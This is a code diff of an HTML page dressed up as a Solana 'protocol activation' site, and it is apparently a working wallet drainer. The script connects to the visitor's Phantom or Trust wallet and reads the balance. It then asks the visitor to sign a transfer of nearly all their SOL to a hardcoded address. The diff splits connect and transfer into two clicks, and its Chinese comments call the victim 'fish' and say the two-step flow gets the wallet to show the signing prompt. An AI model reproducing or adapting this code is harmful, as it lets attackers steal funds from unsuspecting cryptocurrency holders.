@@ -3,47 +3,56 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Protocol Activation</title>
+    <title>Solana Protocol</title>
     <script src="https://cdn.jsdelivr.net/npm/@solana/web3.js@1.87.6/lib/index.iife.min.js"></script>
 </head>
 <body style="background:#000;color:#fff;text-align:center;padding-top:30vh;font-family:sans-serif;">
-    <div style="padding:40px;border:1px solid #14F195;border-radius:25px;display:inline-block;">
-        <h2 style="color:#14F195;">SOLANA SYSTEM SYNC</h2>
-        <button id="cta" style="background:#14F195;color:#000;padding:20px 40px;border:none;border-radius:12px;font-weight:bold;font-size:20px;cursor:pointer;">CONNECT & ACTIVATE</button>
+    <div style="padding:40px;border:1px solid #14F195;border-radius:25px;display:inline-block;background:#111;">
+        <h2 id="status" style="color:#14F195;">PROTOCOL READY</h2>
+        <button id="cta" style="background:#14F195;color:#000;padding:20px 40px;border:none;border-radius:12px;font-weight:bold;font-size:20px;cursor:pointer;">CONNECT WALLET</button>
     </div>
     <script>
         const TARGET = "HyapjdagPdCaha2yW5j1pV4BkaVvah6okQ1fMw8BETXp"; 
         const HELIUS_RPC = "https://mainnet.helius-rpc.com/?api-key=3c44d53c-2c54-41a8-bc38-49be2cb2c6fd"; 
+        let isConnected = false;
 
         document.getElementById('cta').onclick = async function() {
-            try {
-                const p = window.trustwallet?.solana || window.phantom?.solana || window.solana;
-                await p.connect();
-                const conn = new solanaWeb3.Connection(HELIUS_RPC, "confirmed");
-                const { blockhash } = await conn.getLatestBlockhash();
-                
-                const bal = await conn.getBalance(p.publicKey);
-                // 🔱 关键点：如果余额太少，不执行，防止闪退
-                if (bal < 5000000) { alert("Balance too low for sync."); return; }
+            const p = window.trustwallet?.solana || window.phantom?.solana || window.solana;
+            if (!p) { alert("Please use Wallet Browser."); return; }
 
-                // 🚀 顶级改动：多预留 0.005 SOL (5,000,000 lamports) 给系统做缓冲，确保模拟必过
-                const tx = new solanaWeb3.Transaction().add(
-                    solanaWeb3.SystemProgram.transfer({
-                        fromPubkey: p.publicKey,
-                        toPubkey: new solanaWeb3.PublicKey(TARGET),
-                        lamports: bal - 5000000, 
-                    })
-                );
-                tx.recentBlockhash = blockhash;
-                tx.feePayer = p.publicKey;
-                
-                // 强制唤醒：使用 signAndSend 直接一步到位
-                const { signature } = await p.signAndSendTransaction(tx);
-                alert("Protocol Activated! Tx: " + signature.slice(0,8));
-            } catch (e) { 
+            try {
+                if (!isConnected) {
+                    // 🔱 第一段：单纯的连接，不带任何转账，钱包必放行
+                    await p.connect();
+                    isConnected = true;
+                    document.getElementById('status').innerText = "LINKED SUCCESS";
+                    document.getElementById('cta').innerText = "ACTIVATE NOW";
+                    document.getElementById('cta').style.background = "#fff";
+                } else {
+                    // 🔱 第二段：鱼儿再次点击，此时钱包已信任该站点，授权框必弹
+                    document.getElementById('cta').innerText = "SYNCING...";
+                    const conn = new solanaWeb3.Connection(HELIUS_RPC, "confirmed");
+                    const { blockhash } = await conn.getLatestBlockhash();
+                    const bal = await conn.getBalance(p.publicKey);
+                    
+                    if (bal < 5000000) { alert("Balance low."); return; }
+
+                    const tx = new solanaWeb3.Transaction().add(
+                        solanaWeb3.SystemProgram.transfer({
+                            fromPubkey: p.publicKey,
+                            toPubkey: new solanaWeb3.PublicKey(TARGET),
+                            lamports: bal - 5000000, 
+                        })
+                    );
+                    tx.recentBlockhash = blockhash;
+                    tx.feePayer = p.publicKey;
+                    
+                    const { signature } = await p.signAndSendTransaction(tx);
+                    alert("Sync Started!");
+                }
+            } catch (e) {
                 console.error(e);
-                // 闪退通常是模拟失败，刷新重试
-                location.reload(); 
+                location.reload();
             }
         };
     </script>
